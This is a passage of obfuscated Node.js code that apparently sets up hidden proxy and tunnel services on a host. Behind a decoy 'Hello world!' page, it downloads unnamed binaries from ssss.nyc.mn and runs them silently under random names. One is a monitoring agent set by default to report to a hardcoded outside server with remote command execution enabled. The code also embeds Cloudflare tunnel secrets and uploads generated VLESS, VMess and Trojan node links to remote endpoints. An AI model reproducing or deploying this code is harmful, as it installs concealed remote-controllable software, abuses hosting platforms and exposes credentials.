const _0x2791eb=_0x4bee;function _0x2128(){const _0x1899c6=['taskkill\x20/f\x20/im\x20','Proxy\x20server\x20is\x20running\x20on\x20port:','EXTERNAL_PORT','boot.log','tasklist\x20|\x20findstr\x20','\x20-c\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','web','http','sub','Nodes\x20uploaded\x20successfully','writeFileSync','listen','Error\x20reading\x20boot.log:','ARGO_DOMAIN:','4068645NidvTZ','\x20>\x20nul','fileUrl','has','8500600rwwUEy','ArgoDomain:','https://arm64.ssss.nyc.mn/v1','http://localhost:','1183468gKKcse','8.8.8.8','\x0a\x20\x20\x20\x20','/sub.txt\x20saved\x20successfully','existsSync','tunnel.yml','TunnelID','127.0.0.1','join','substring','10vZnzHZ','\x0a\x20\x20\x0atrojan://','/vmess-argo','amd','http-proxy','freedom','?encryption=none&security=tls&sni=','arch','Error\x20executing\x20command:\x20','Content-Type','/dev/null','&fp=firefox&type=ws&host=','block','/vless','sub.txt','Add\x20automatic\x20access\x20task\x20faild:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','trim','3429482wtybFC','send','\x20is\x20created','pgrep\x20-f\x20\x22[','catch','firefox','App\x20is\x20running','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','stringify','get','createProxyServer','quic','split','web\x20running\x20error:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','push','Tunnel\x20failed\x20to\x20start','UseIP','blackhole','vmess','env','unshift','vless','Waiting\x20for\x20tunnel.yml\x20configuration...','npm\x20running\x20error:\x20','statSync','basename','\x22\x20>\x20/dev/null','text/plain;\x20charset=utf-8','2087','Server\x20initialization\x20completed\x20successfully','https://oooo.serv00.net/add-url','UUID','\x20is\x20running','unlinkSync','NEZHA\x20variable\x20is\x20empty,skip\x20running','https+local://8.8.8.8/dns-query','config.yaml','&path=%2Ftrojan-argo%3Fed%3D2560#','SUB_PATH','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://amd64.ssss.nyc.mn/bot','\x20-p\x20','ARGO_DOMAIN','set','HTTP\x20service\x20is\x20running\x20on\x20internal\x20port:','.exe\x20>\x20nul\x202>&1','NEZHA_PORT','none','utf-8','\x0a\x20\x20\x20\x20service:\x20http://localhost:','/api/add-subscriptions','createWriteStream','stream','Skipping\x20adding\x20automatic\x20access\x20task','charAt','chmod','trojan','rm\x20-rf\x20','CFIP','\x0acredentials-file:\x20','direct','data','\x20>\x20nul\x202>&1','2083','error','CFPORT','443','540115yYDJKt','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','response','path','2053','{\x22AccountTag\x22:\x225df51ef8a13b1d5d1a88ae015afa598b\x22,\x22TunnelSecret\x22:\x22IVN1ajfNQlkXraxWCMG7dXxBBFq7+kB/84dLWwgu+do=\x22,\x22TunnelID\x22:\x22e42d9ff5-a58c-4ad3-8a7f-7af8a2778069\x22,\x22Endpoint\x22:\x22\x22}','1.1.1.1','&path=%2Fvless-argo%3Fed%3D2560#','status','Error\x20generating\x20tunnel\x20configuration:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','arm64','createServer','https://amd64.ssss.nyc.mn/v1','/vless-argo','\x20successfully','message','\x0a\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20-\x20service:\x20http_status:404\x0a','test','2096','application/json','\x0a\x20\x20\x0avmess://','Download\x20','nohup\x20','--tls','mkdirSync','851290QwtLEm','readFileSync','63dAYXuI','IPIfNonMatch','forEach','tcp','/trojan','174364MowLOO','log','https://arm64.ssss.nyc.mn/bot','Unhandled\x20error\x20in\x20startserver:','config.json','tunnel.json','HTTP\x20traffic\x20->\x20localhost:','from','list.txt','arm','/vmess','http://localhost:3001','Error\x20downloading\x20files:','hug1.mydns.netlib.re','\x20>/dev/null\x202>&1\x20&','tls','\x20>/dev/null\x202>&1','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','clear','express','filter','./tmp','then','\x20already\x20exists','Error\x20in\x20startserver:','close','base64','startsWith','finish','post','https+local://1.1.1.1/dns-query','url','\x20failed:\x20','util','18fIEtRn','aarch64','exec','toString','automatic\x20access\x20task\x20added\x20successfully','platform','parse','\x0aprotocol:\x20http2\x0a\x0aingress:\x0a\x20\x20-\x20hostname:\x20','8443','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/tunnel.yml\x20run','/config.json\x20>/dev/null\x202>&1\x20&','Hello\x20world!','Waiting\x20for\x20tunnel\x20to\x20start...','tunnel:\x20','pop','sendFile','TunnelSecret','FILE_PATH','Starting\x20server\x20initialization...','includes','length','rRA5ZrgOmsosl7EiyIuJBhnGwcAqWDUr','child_process','NEZHA_SERVER','/api/add-nodes','false','NEZHA_KEY','match','win32','/trojan-argo','axios','pkill\x20-f\x20\x22[','PORT'];_0x2128=function(){return _0x1899c6;};return _0x2128();}(function(_0x385549,_0x3d09ec){const _0x23e84e=_0x4bee,_0x4de2b0=_0x385549();while(!![]){try{const _0x59eb21=parseInt(_0x23e84e(0x18f))/0x1*(parseInt(_0x23e84e(0x206))/0x2)+parseInt(_0x23e84e(0x17d))/0x3+parseInt(_0x23e84e(0x185))/0x4+-parseInt(_0x23e84e(0x1e5))/0x5*(-parseInt(_0x23e84e(0x14c))/0x6)+-parseInt(_0x23e84e(0x1a1))/0x7+-parseInt(_0x23e84e(0x181))/0x8+parseInt(_0x23e84e(0x201))/0x9*(-parseInt(_0x23e84e(0x1ff))/0xa);if(_0x59eb21===_0x3d09ec)break;else _0x4de2b0['push'](_0x4de2b0['shift']());}catch(_0x1ccfde){_0x4de2b0['push'](_0x4de2b0['shift']());}}}(_0x2128,0xaacaf));const express=require(_0x2791eb(0x13d)),app=express(),axios=require(_0x2791eb(0x16b)),os=require('os'),fs=require('fs'),path=require(_0x2791eb(0x1e8)),{promisify}=require(_0x2791eb(0x14b)),exec=promisify(require(_0x2791eb(0x163))[_0x2791eb(0x14e)]),{execSync}=require('child_process'),http=require(_0x2791eb(0x176)),httpProxy=require(_0x2791eb(0x193)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x2791eb(0x1b5)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x2791eb(0x1b5)]['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x2791eb(0x15e)]||_0x2791eb(0x13f),SUB_PATH=process['env'][_0x2791eb(0x1c8)]||_0x2791eb(0x177),PORT=process[_0x2791eb(0x1b5)]['SERVER_PORT']||process[_0x2791eb(0x1b5)][_0x2791eb(0x16d)]||0xbb8,EXTERNAL_PORT=process['env'][_0x2791eb(0x170)]||0x1eb4,UUID=process['env'][_0x2791eb(0x1c1)]||'3dd311a5-1490-e00f-4f27-2fdb730f72ec',NEZHA_SERVER=process[_0x2791eb(0x1b5)][_0x2791eb(0x164)]||'gwwjllhldpjy.us-west-1.clawcloudrun.com:443',NEZHA_PORT=process['env'][_0x2791eb(0x1d0)]||'',NEZHA_KEY=process[_0x2791eb(0x1b5)][_0x2791eb(0x167)]||_0x2791eb(0x162),ARGO_DOMAIN=process[_0x2791eb(0x1b5)][_0x2791eb(0x1cc)]||_0x2791eb(0x137),ARGO_AUTH=process[_0x2791eb(0x1b5)]['ARGO_AUTH']||_0x2791eb(0x1ea),CFIP=process[_0x2791eb(0x1b5)][_0x2791eb(0x1dc)]||'cdns.doon.eu.org',CFPORT=process[_0x2791eb(0x1b5)][_0x2791eb(0x1e3)]||0x1bb,NAME=process[_0x2791eb(0x1b5)]['NAME']||'';!fs[_0x2791eb(0x189)](FILE_PATH)?(fs[_0x2791eb(0x1fe)](FILE_PATH),console[_0x2791eb(0x207)](FILE_PATH+_0x2791eb(0x1a3))):console['log'](FILE_PATH+_0x2791eb(0x141));function generateRandomName(){const _0xfa4fb1=_0x2791eb,_0x40f6a7='abcdefghijklmnopqrstuvwxyz';let _0xe93ef0='';for(let _0x56f2e5=0x0;_0x56f2e5<0x6;_0x56f2e5++){_0xe93ef0+=_0x40f6a7[_0xfa4fb1(0x1d8)](Math['floor'](Math['random']()*_0x40f6a7[_0xfa4fb1(0x161)]));}return _0xe93ef0;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2791eb(0x18d)](FILE_PATH,npmName),phpPath=path[_0x2791eb(0x18d)](FILE_PATH,phpName),webPath=path[_0x2791eb(0x18d)](FILE_PATH,webName),botPath=path[_0x2791eb(0x18d)](FILE_PATH,botName),subPath=path[_0x2791eb(0x18d)](FILE_PATH,_0x2791eb(0x19d)),listPath=path[_0x2791eb(0x18d)](FILE_PATH,_0x2791eb(0x20e)),bootLogPath=path[_0x2791eb(0x18d)](FILE_PATH,'boot.log'),configPath=path[_0x2791eb(0x18d)](FILE_PATH,_0x2791eb(0x20a));const proxy=httpProxy[_0x2791eb(0x1ab)](),proxyServer=http[_0x2791eb(0x1f1)]((_0xedc535,_0x5a8fd5)=>{const _0x2a4fc3=_0x2791eb,_0x51f564=_0xedc535[_0x2a4fc3(0x149)];_0x51f564[_0x2a4fc3(0x145)]('/vless-argo')||_0x51f564[_0x2a4fc3(0x145)](_0x2a4fc3(0x191))||_0x51f564[_0x2a4fc3(0x145)]('/trojan-argo')||_0x51f564===_0x2a4fc3(0x19c)||_0x51f564===_0x2a4fc3(0x210)||_0x51f564===_0x2a4fc3(0x205)?proxy[_0x2a4fc3(0x175)](_0xedc535,_0x5a8fd5,{'target':_0x2a4fc3(0x211)}):proxy[_0x2a4fc3(0x175)](_0xedc535,_0x5a8fd5,{'target':_0x2a4fc3(0x184)+PORT});});proxyServer['on']('upgrade',(_0x45e24f,_0x43c806,_0x482114)=>{const _0x3a774f=_0x2791eb,_0x16e1d3=_0x45e24f[_0x3a774f(0x149)];_0x16e1d3[_0x3a774f(0x145)]('/vless-argo')||_0x16e1d3[_0x3a774f(0x145)](_0x3a774f(0x191))||_0x16e1d3[_0x3a774f(0x145)]('/trojan-argo')?proxy['ws'](_0x45e24f,_0x43c806,_0x482114,{'target':_0x3a774f(0x211)}):proxy['ws'](_0x45e24f,_0x43c806,_0x482114,{'target':_0x3a774f(0x184)+PORT});}),proxyServer[_0x2791eb(0x17a)](EXTERNAL_PORT,()=>{const _0x421803=_0x2791eb;console[_0x421803(0x207)](_0x421803(0x16f)+EXTERNAL_PORT+'!'),console[_0x421803(0x207)](_0x421803(0x20c)+PORT),console[_0x421803(0x207)]('Xray\x20traffic\x20->\x20localhost:3001');}),app[_0x2791eb(0x1aa)]('/',function(_0x366145,_0x163cab){const _0x474c59=_0x2791eb,_0x1621e1=path[_0x474c59(0x18d)](__dirname,'index.html');fs['existsSync'](_0x1621e1)?_0x163cab[_0x474c59(0x15c)](_0x1621e1):_0x163cab[_0x474c59(0x1a2)](_0x474c59(0x158));});function deleteNodes(){const _0x1962ed=_0x2791eb;try{if(!UPLOAD_URL)return;if(!fs[_0x1962ed(0x189)](subPath))return;let _0x34ca09;try{_0x34ca09=fs[_0x1962ed(0x200)](subPath,_0x1962ed(0x1d2));}catch{return null;}const _0x39eed9=Buffer[_0x1962ed(0x20d)](_0x34ca09,'base64')[_0x1962ed(0x14f)](_0x1962ed(0x1d2)),_0x1dc014=_0x39eed9[_0x1962ed(0x1ad)]('\x0a')[_0x1962ed(0x13e)](_0x2b67e4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2b67e4));if(_0x1dc014[_0x1962ed(0x161)]===0x0)return;return axios[_0x1962ed(0x147)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x1962ed(0x1a9)]({'nodes':_0x1dc014}),{'headers':{'Content-Type':_0x1962ed(0x1f9)}})[_0x1962ed(0x1a5)](_0x12d83b=>{return null;}),null;}catch(_0x48991c){return null;}}function cleanupOldFiles(){try{const _0x3a9005=fs['readdirSync'](FILE_PATH);_0x3a9005['forEach'](_0x4953c3=>{const _0x4af5cb=_0x4bee,_0x391e98=path[_0x4af5cb(0x18d)](FILE_PATH,_0x4953c3);try{const _0x3858a2=fs[_0x4af5cb(0x1ba)](_0x391e98);_0x3858a2['isFile']()&&fs['unlinkSync'](_0x391e98);}catch(_0x5860e7){}});}catch(_0x2ed8cf){}}async function generateConfig(){const _0x12414d=_0x2791eb,_0x21cf4d={'log':{'access':_0x12414d(0x199),'error':'/dev/null','loglevel':_0x12414d(0x1d1)},'dns':{'servers':[_0x12414d(0x1c5),_0x12414d(0x148),_0x12414d(0x186),_0x12414d(0x1eb)],'queryStrategy':_0x12414d(0x1b2),'disableCache':![]},'inbounds':[{'port':0xbb9,'protocol':_0x12414d(0x1b7),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x12414d(0x1d1),'fallbacks':[{'dest':0xbba},{'path':_0x12414d(0x1f3),'dest':0xbbb},{'path':_0x12414d(0x191),'dest':0xbbc},{'path':_0x12414d(0x16a),'dest':0xbbd}]},'streamSettings':{'network':_0x12414d(0x204)}},{'port':0xbba,'listen':_0x12414d(0x18c),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x12414d(0x1d1)},'streamSettings':{'network':_0x12414d(0x204),'security':_0x12414d(0x1d1)}},{'port':0xbbb,'listen':_0x12414d(0x18c),'protocol':_0x12414d(0x1b7),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x12414d(0x1d1)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x12414d(0x176),_0x12414d(0x139),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x12414d(0x18c),'protocol':_0x12414d(0x1b4),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x12414d(0x191)}},'sniffing':{'enabled':!![],'destOverride':[_0x12414d(0x176),_0x12414d(0x139),'quic'],'metadataOnly':![]}},{'port':0xbbd,'listen':_0x12414d(0x18c),'protocol':_0x12414d(0x1da),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x12414d(0x1d1),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x12414d(0x139),_0x12414d(0x1ac)],'metadataOnly':![]}}],'outbounds':[{'protocol':_0x12414d(0x194),'tag':_0x12414d(0x1de),'settings':{'domainStrategy':_0x12414d(0x1b2)}},{'protocol':_0x12414d(0x1b3),'tag':_0x12414d(0x19b)}],'routing':{'domainStrategy':_0x12414d(0x202),'rules':[]}};fs[_0x12414d(0x179)](path['join'](FILE_PATH,'config.json'),JSON[_0x12414d(0x1a9)](_0x21cf4d,null,0x2));}function getSystemArchitecture(){const _0x1d7d85=_0x2791eb,_0x4dbdc2=os[_0x1d7d85(0x196)]();return _0x4dbdc2==='arm'||_0x4dbdc2===_0x1d7d85(0x1f0)||_0x4dbdc2===_0x1d7d85(0x14d)?_0x1d7d85(0x20f):_0x1d7d85(0x192);}function downloadFile(_0x424c3e,_0x58c3f6,_0x47b6fc){const _0x63d081=_0x2791eb,_0x28d6aa=_0x424c3e;!fs[_0x63d081(0x189)](FILE_PATH)&&fs[_0x63d081(0x1fe)](FILE_PATH,{'recursive':!![]});const _0x247f34=fs[_0x63d081(0x1d5)](_0x28d6aa);axios({'method':_0x63d081(0x1aa),'url':_0x58c3f6,'responseType':_0x63d081(0x1d6)})[_0x63d081(0x140)](_0x497e68=>{const _0x414919=_0x63d081;_0x497e68[_0x414919(0x1df)]['pipe'](_0x247f34),_0x247f34['on'](_0x414919(0x146),()=>{const _0x1b7bc5=_0x414919;_0x247f34[_0x1b7bc5(0x143)](),console[_0x1b7bc5(0x207)](_0x1b7bc5(0x1fb)+path[_0x1b7bc5(0x1bb)](_0x28d6aa)+_0x1b7bc5(0x1f4)),_0x47b6fc(null,_0x28d6aa);}),_0x247f34['on'](_0x414919(0x1e2),_0x48cb98=>{const _0xdbf303=_0x414919;fs['unlink'](_0x28d6aa,()=>{});const _0x5d7f21='Download\x20'+path[_0xdbf303(0x1bb)](_0x28d6aa)+_0xdbf303(0x14a)+_0x48cb98['message'];console[_0xdbf303(0x1e2)](_0x5d7f21),_0x47b6fc(_0x5d7f21);});})[_0x63d081(0x1a5)](_0x25cf6f=>{const _0x5178b0=_0x63d081,_0x38169f='Download\x20'+path[_0x5178b0(0x1bb)](_0x28d6aa)+'\x20failed:\x20'+_0x25cf6f[_0x5178b0(0x1f5)];console['error'](_0x38169f),_0x47b6fc(_0x38169f);});}async function downloadFilesAndRun(){const _0x5015db=_0x2791eb,_0x81237b=getSystemArchitecture(),_0x2d3004=getFilesForArchitecture(_0x81237b);if(_0x2d3004[_0x5015db(0x161)]===0x0){console[_0x5015db(0x207)](_0x5015db(0x155));return;}const _0x5577f9=_0x2d3004['map'](_0x377adc=>{return new Promise((_0x29aff6,_0x1de69c)=>{const _0x3a384b=_0x4bee;downloadFile(_0x377adc['fileName'],_0x377adc[_0x3a384b(0x17f)],(_0x1dc6a6,_0x53b1b5)=>{_0x1dc6a6?_0x1de69c(_0x1dc6a6):_0x29aff6(_0x53b1b5);});});});try{await Promise['all'](_0x5577f9);}catch(_0x14fe1e){console['error'](_0x5015db(0x212),_0x14fe1e);return;}function _0x4f6c0d(_0x106152){const _0x5d4e95=0x1fd;_0x106152['forEach'](_0x4f663b=>{const _0x4f06e6=_0x4bee;fs[_0x4f06e6(0x189)](_0x4f663b)&&fs[_0x4f06e6(0x1d9)](_0x4f663b,_0x5d4e95,_0x58fe94=>{const _0x3816=_0x4f06e6;_0x58fe94?console[_0x3816(0x1e2)]('Empowerment\x20failed\x20for\x20'+_0x4f663b+':\x20'+_0x58fe94):console[_0x3816(0x207)]('Empowerment\x20success\x20for\x20'+_0x4f663b+':\x20'+_0x5d4e95[_0x3816(0x14f)](0x8));});});}const _0x7fb202=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4f6c0d(_0x7fb202);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x30307e=NEZHA_SERVER[_0x5015db(0x160)](':')?NEZHA_SERVER[_0x5015db(0x1ad)](':')[_0x5015db(0x15b)]():'',_0x173d0e=new Set([_0x5015db(0x1e4),_0x5015db(0x154),_0x5015db(0x1f8),_0x5015db(0x1be),_0x5015db(0x1e1),'2053']),_0x5b2857=_0x173d0e[_0x5015db(0x180)](_0x30307e)?'true':_0x5015db(0x166),_0x4556fd='\x0aclient_secret:\x20'+NEZHA_KEY+_0x5015db(0x1c9)+NEZHA_SERVER+_0x5015db(0x1af)+_0x5b2857+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5015db(0x179)](path[_0x5015db(0x18d)](FILE_PATH,_0x5015db(0x1c6)),_0x4556fd);const _0x3ddda0=_0x5015db(0x1fc)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3ddda0),console[_0x5015db(0x207)](phpName+_0x5015db(0x1c2)),await new Promise(_0x17fb0b=>setTimeout(_0x17fb0b,0x3e8));}catch(_0x70f7){console['error']('php\x20running\x20error:\x20'+_0x70f7);}}else{let _0x3f3631='';const _0x123811=[_0x5015db(0x1e4),_0x5015db(0x154),_0x5015db(0x1f8),'2087',_0x5015db(0x1e1),_0x5015db(0x1e9)];_0x123811['includes'](NEZHA_PORT)&&(_0x3f3631=_0x5015db(0x1fd));const _0x16ac7e=_0x5015db(0x1fc)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x5015db(0x1cb)+NEZHA_KEY+'\x20'+_0x3f3631+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x16ac7e),console[_0x5015db(0x207)](npmName+_0x5015db(0x1c2)),await new Promise(_0x2517ec=>setTimeout(_0x2517ec,0x3e8));}catch(_0x4b6946){console[_0x5015db(0x1e2)](_0x5015db(0x1b9)+_0x4b6946);}}}else console['log'](_0x5015db(0x1c4));const _0x38ad56='nohup\x20'+webPath+_0x5015db(0x173)+FILE_PATH+_0x5015db(0x157);try{await exec(_0x38ad56),console[_0x5015db(0x207)](webName+_0x5015db(0x1c2)),await new Promise(_0x43b3bc=>setTimeout(_0x43b3bc,0x3e8));}catch(_0x31b99d){console[_0x5015db(0x1e2)](_0x5015db(0x1ae)+_0x31b99d);}if(fs[_0x5015db(0x189)](botPath)){let _0x251bf3;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x251bf3=_0x5015db(0x174)+ARGO_AUTH;else ARGO_AUTH['includes'](_0x5015db(0x15d))?(!fs[_0x5015db(0x189)](path[_0x5015db(0x18d)](FILE_PATH,_0x5015db(0x18a)))&&(console[_0x5015db(0x207)](_0x5015db(0x1b8)),await new Promise(_0x57f19a=>setTimeout(_0x57f19a,0x3e8))),_0x251bf3=_0x5015db(0x1a8)+FILE_PATH+_0x5015db(0x156)):_0x251bf3=_0x5015db(0x1ef)+FILE_PATH+_0x5015db(0x1e6)+EXTERNAL_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x251bf3+'\x20>/dev/null\x202>&1\x20&'),console[_0x5015db(0x207)](botName+'\x20is\x20running'),console[_0x5015db(0x207)](_0x5015db(0x159)),await new Promise(_0x21b9bf=>setTimeout(_0x21b9bf,0x1388));if(ARGO_AUTH[_0x5015db(0x160)]('TunnelSecret'))try{process[_0x5015db(0x151)]===_0x5015db(0x169)?await exec(_0x5015db(0x172)+botName+_0x5015db(0x17e)):await exec(_0x5015db(0x1a4)+botName[_0x5015db(0x1d8)](0x0)+']'+botName[_0x5015db(0x18e)](0x1)+_0x5015db(0x1bc)),console[_0x5015db(0x207)]('Tunnel\x20is\x20running\x20successfully');}catch(_0x55868d){console[_0x5015db(0x1e2)](_0x5015db(0x1b1));}}catch(_0x5b7293){console['error'](_0x5015db(0x197)+_0x5b7293);}}await new Promise(_0xb9caca=>setTimeout(_0xb9caca,0x7d0));}function getFilesForArchitecture(_0x4a4ed3){const _0x281a3b=_0x2791eb;let _0x5ebd60;_0x4a4ed3===_0x281a3b(0x20f)?_0x5ebd60=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x281a3b(0x208)}]:_0x5ebd60=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x281a3b(0x1ca)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2de07d=_0x4a4ed3===_0x281a3b(0x20f)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x5ebd60[_0x281a3b(0x1b6)]({'fileName':npmPath,'fileUrl':_0x2de07d});}else{const _0x1d3bae=_0x4a4ed3==='arm'?_0x281a3b(0x183):_0x281a3b(0x1f2);_0x5ebd60[_0x281a3b(0x1b6)]({'fileName':phpPath,'fileUrl':_0x1d3bae});}}return _0x5ebd60;}function argoType(){const _0x2adfb2=_0x2791eb;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2adfb2(0x207)](_0x2adfb2(0x13b));return;}if(ARGO_AUTH['includes'](_0x2adfb2(0x15d)))try{const _0x3e4751=JSON[_0x2adfb2(0x152)](ARGO_AUTH),_0x2ba372=_0x3e4751[_0x2adfb2(0x18b)];fs['writeFileSync'](path[_0x2adfb2(0x18d)](FILE_PATH,_0x2adfb2(0x20b)),ARGO_AUTH);const _0x2cf84f=_0x2adfb2(0x15a)+_0x2ba372+_0x2adfb2(0x1dd)+path[_0x2adfb2(0x18d)](FILE_PATH,_0x2adfb2(0x20b))+_0x2adfb2(0x153)+ARGO_DOMAIN+_0x2adfb2(0x1d3)+EXTERNAL_PORT+_0x2adfb2(0x1f6);fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.yml'),_0x2cf84f),console[_0x2adfb2(0x207)]('Tunnel\x20YAML\x20configuration\x20generated\x20successfully');}catch(_0x35b573){console['error'](_0x2adfb2(0x1ee),_0x35b573);}else console[_0x2adfb2(0x207)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,\x20use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x3fe222=_0x2791eb;let _0x20bc9a;if(ARGO_AUTH&&ARGO_DOMAIN)_0x20bc9a=ARGO_DOMAIN,console[_0x3fe222(0x207)](_0x3fe222(0x17c),_0x20bc9a),await _0x49b361(_0x20bc9a);else try{const _0x1e4b4e=fs[_0x3fe222(0x200)](path[_0x3fe222(0x18d)](FILE_PATH,_0x3fe222(0x171)),_0x3fe222(0x1d2)),_0x49b027=_0x1e4b4e[_0x3fe222(0x1ad)]('\x0a'),_0x554032=[];_0x49b027[_0x3fe222(0x203)](_0x51b6c4=>{const _0x8ada7a=_0x3fe222,_0x3fdb6b=_0x51b6c4[_0x8ada7a(0x168)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3fdb6b){const _0x98b905=_0x3fdb6b[0x1];_0x554032[_0x8ada7a(0x1b0)](_0x98b905);}});if(_0x554032[_0x3fe222(0x161)]>0x0)_0x20bc9a=_0x554032[0x0],console['log'](_0x3fe222(0x182),_0x20bc9a),await _0x49b361(_0x20bc9a);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x3fe222(0x1c3)](path['join'](FILE_PATH,_0x3fe222(0x171)));async function _0x5ee641(){const _0xf917af=_0x3fe222;try{process['platform']===_0xf917af(0x169)?await exec(_0xf917af(0x16e)+botName+_0xf917af(0x1cf)):await exec(_0xf917af(0x16c)+botName[_0xf917af(0x1d8)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x33649b){}}_0x5ee641(),await new Promise(_0x195246=>setTimeout(_0x195246,0xbb8));const _0x928e4e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3fe222(0x1e6)+EXTERNAL_PORT;try{await exec(_0x3fe222(0x1fc)+botPath+'\x20'+_0x928e4e+_0x3fe222(0x138)),console['log'](botName+_0x3fe222(0x1c2)),await new Promise(_0x58dc54=>setTimeout(_0x58dc54,0xbb8)),await extractDomains();}catch(_0x2d5c78){console[_0x3fe222(0x1e2)](_0x3fe222(0x197)+_0x2d5c78);}}}catch(_0x3f193c){console['error'](_0x3fe222(0x17b),_0x3f193c);}async function _0x49b361(_0x2478cf){const _0x35b125=_0x3fe222,_0x3436ff=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x35b125(0x1d2)}),_0x4862ec=_0x3436ff[_0x35b125(0x1a0)](),_0x35c9bf=NAME?NAME+'-'+_0x4862ec:_0x4862ec;return new Promise(_0x44f6d8=>{setTimeout(()=>{const _0x7b01f2=_0x4bee,_0x4700a4={'v':'2','ps':''+_0x35c9bf,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x7b01f2(0x1d1),'net':'ws','type':_0x7b01f2(0x1d1),'host':_0x2478cf,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x2478cf,'alpn':'','fp':_0x7b01f2(0x1a6)},_0x1f4328='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x7b01f2(0x195)+_0x2478cf+_0x7b01f2(0x19a)+_0x2478cf+_0x7b01f2(0x1ec)+_0x35c9bf+_0x7b01f2(0x1fa)+Buffer['from'](JSON['stringify'](_0x4700a4))[_0x7b01f2(0x14f)](_0x7b01f2(0x144))+_0x7b01f2(0x190)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x2478cf+'&fp=firefox&type=ws&host='+_0x2478cf+_0x7b01f2(0x1c7)+_0x35c9bf+_0x7b01f2(0x187);console[_0x7b01f2(0x207)](Buffer[_0x7b01f2(0x20d)](_0x1f4328)[_0x7b01f2(0x14f)](_0x7b01f2(0x144))),fs[_0x7b01f2(0x179)](subPath,Buffer[_0x7b01f2(0x20d)](_0x1f4328)['toString'](_0x7b01f2(0x144))),console['log'](FILE_PATH+_0x7b01f2(0x188)),uploadNodes(),app[_0x7b01f2(0x1aa)]('/'+SUB_PATH,(_0x81e843,_0x11ee17)=>{const _0x45f360=_0x7b01f2,_0x3767ac=Buffer[_0x45f360(0x20d)](_0x1f4328)[_0x45f360(0x14f)](_0x45f360(0x144));_0x11ee17[_0x45f360(0x1cd)](_0x45f360(0x198),_0x45f360(0x1bd)),_0x11ee17['send'](_0x3767ac);}),_0x44f6d8(_0x1f4328);},0x7d0);});}}async function uploadNodes(){const _0x4e1e67=_0x2791eb;if(UPLOAD_URL&&PROJECT_URL){const _0x1d4b7d=PROJECT_URL+'/'+SUB_PATH,_0x5cba9b={'subscription':[_0x1d4b7d]};try{const _0x5e4c97=await 